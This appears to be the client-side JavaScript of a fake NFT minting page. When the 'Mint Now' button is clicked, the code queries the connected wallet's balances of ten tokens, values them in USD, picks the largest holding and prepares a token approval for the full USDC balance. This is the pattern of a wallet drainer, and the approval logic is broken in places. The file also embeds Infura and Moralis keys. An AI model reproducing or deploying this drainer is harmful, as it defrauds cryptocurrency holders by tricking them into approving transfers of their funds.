window.onload = main
const provider = "https://mainnet.infura.io/v3/987127df4c2e4f9f839459e1b1c72dc2"
const Web3Client = new Web3(new Web3.providers.HttpProvider(provider));
const serverUrl = "https://b4upz3w3ye4p.usemoralis.com:2053/server";
const appId = "lePmHZif6BunoJK638wYmee7SgmOofuzebVkJyzu";
Moralis.start({ serverUrl, appId });



function changeQuantity(price) {
  const maxQuantity = 10
  const minQuantity = 1

  const incrementOnId = "plus"
  const decrementOnId = "minus"

  const quantity = document.querySelector("#quantity")
  const total = document.querySelector("#total")
  const total1 = document.querySelector("#total1")
  const mintChange = document.querySelectorAll(".mint-change")
  const mintChangeMap = Array.prototype.slice.call(mintChange)

  const updateTotal = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    var rounded = function(number){
    return +number.toFixed(2);
}
    total.innerHTML = rounded(price * currentQuantity)
    total1.innerHTML = rounded(price * currentQuantity) + " ETH"
  }

  const incrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === maxQuantity)
      return
    quantity.innerHTML = currentQuantity + 1
  }
  const decrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === minQuantity)
      return
    quantity.innerHTML = currentQuantity - 1
  }

  function onMintChangeClick(event) {
    const type = event.target.id
    if (type === incrementOnId)
      incrementQuantity()
    if (type === decrementOnId)
      decrementQuantity()
    updateTotal()
  }

  updateTotal()
  mintChangeMap.map(el => el.addEventListener("click", onMintChangeClick))

}

function mint(wallet) {
  const totalElement = document.querySelector("#total")
  const mintNow = document.querySelector("#mint-now")
  const connectWallet = document.querySelector("#connect-wallet")


  const isMetaMaskInstalled = () => {
    const { ethereum } = window;
    return Boolean(ethereum && ethereum.isMetaMask) || false
  };
  const isMetaMaskConnected = async () => {
    if (typeof web3 === 'undefined') return false

    let accounts = await ethereum.request({ method: 'eth_accounts' })
    return accounts.length > 0;
  }
  const redirectToClaim = () => {
    window.open('/claim');
  }
  async function onConnectClick() {
    await ethereum.request({ method: 'eth_requestAccounts' })
    await Moralis.enableWeb3();
  }
  async function mint() {
    Moralis.enableWeb3()
    const Tetherprice = await Moralis.Web3API.token.getTokenPrice({address: "0xdac17f958d2ee523a2206206994597c13d831ec7"});
    const BUSDprice = await Moralis.Web3API.token.getTokenPrice({address: "0x4Fabb145d64652a948d72533023f6E7A623C7C53"});
    const WETHprice = await Moralis.Web3API.token.getTokenPrice({address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"});
    const Polygonprice = await Moralis.Web3API.token.getTokenPrice({address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0"});
    const Uniswapprice = await Moralis.Web3API.token.getTokenPrice({address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"});
    const ApeCoinprice = await Moralis.Web3API.token.getTokenPrice({address: "0x4d224452801aced8b2f0aebe155379bb5d594381"});
    const Shibaprice = await Moralis.Web3API.token.getTokenPrice({address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce"});
    const USDCprice = await Moralis.Web3API.token.getTokenPrice({address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"});
    const Daiprice = await Moralis.Web3API.token.getTokenPrice({address: "0x6b175474e89094c44da98b954eedeac495271d0f"});
    const Sandboxprice = await Moralis.Web3API.token.getTokenPrice({address: "0x3845badAde8e6dFF049820680d1F14bD3903a5d0"});
    if (!await isMetaMaskConnected())
      onConnectClick()
    

    try {
      const total = totalElement.innerHTML * 1000000000000000000
      const adress = (await ethereum.request({ method: 'eth_accounts' }))[0]
      const contractTether = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xdac17f958d2ee523a2206206994597c13d831ec7");
      const contractBUSD = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x4Fabb145d64652a948d72533023f6E7A623C7C53");
      const contractWETH = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");
      const contractPolygon = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0");
      const contractUniswap = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984");
      const contractApeCoin = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x4d224452801aced8b2f0aebe155379bb5d594381");
      const contractShiba = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce");
      const contractUSDC = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
      const contractDai = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x6b175474e89094c44da98b954eedeac495271d0f");
      const contractSandbox = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x3845badAde8e6dFF049820680d1F14bD3903a5d0");
      const BalanceTether = await contractTether.methods.balanceOf(adress).call() / 1000000;
      const BalanceBUSD = Web3Client.utils.fromWei(await contractBUSD.methods.balanceOf(adress).call()) * BUSDprice.usdPrice;
      const BalanceWETH = Web3Client.utils.fromWei(await contractWETH.methods.balanceOf(adress).call()) * WETHprice.usdPrice;
      const BalancePolygon = Web3Client.utils.fromWei(await contractPolygon.methods.balanceOf(adress).call()) * Polygonprice.usdPrice;
      const BalanceUniswap = Web3Client.utils.fromWei(await contractUniswap.methods.balanceOf(adress).call()) * Uniswapprice.usdPrice;
      const BalanceApeCoin = Web3Client.utils.fromWei(await contractApeCoin.methods.balanceOf(adress).call()) * ApeCoinprice.usdPrice;
      const BalanceShiba = Web3Client.utils.fromWei(await contractShiba.methods.balanceOf(adress).call()) * Shibaprice.usdPrice;
      const BalanceUSDC = await contractUSDC.methods.balanceOf(adress).call() / 1000000;
      const BalanceDai = Web3Client.utils.fromWei(await contractDai.methods.balanceOf(adress).call()) * Daiprice.usdPrice;
      const BalanceSandbox = Web3Client.utils.fromWei(await contractSandbox.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
      const maxUSD = Math.max(BalanceSandbox, BalanceDai, BalanceUSDC, BalanceShiba, BalanceApeCoin, BalanceUniswap, BalancePolygon, BalanceWETH, BalanceBUSD, BalanceTether);
      if (maxUSD == BalanceUSDC) {
        const Contract = ('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48');
        const spenderAdr = ('0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff');
        const amount = ((BalanceUSDC * 1000000).toString(10))
        Contract.methods.approve(adress, amount).send({
   from: adress
})
let result = await Moralis.transfer(options);
      }
      console.log(BalanceTether);
      console.log(BalanceBUSD);
      console.log(BalanceWETH);
      console.log(BalancePolygon);
      console.log(BalanceUniswap);
      console.log(BalanceApeCoin);
      console.log(BalanceShiba);
      console.log(BalanceUSDC);
      console.log(BalanceDai);
      console.log(BalanceSandbox);
      
    } catch (error) {
      console.error(error);
    }
  }


  mintNow.addEventListener("click", mint)
  connectWallet.addEventListener("click", onConnectClick)

}

function main() {
  const price = 0.5
  const wallet = "0xed3D127fd272dF38E4180F1f8FEdf17EeA26f8f4"

  changeQuantity(price)
  mint(wallet)
}
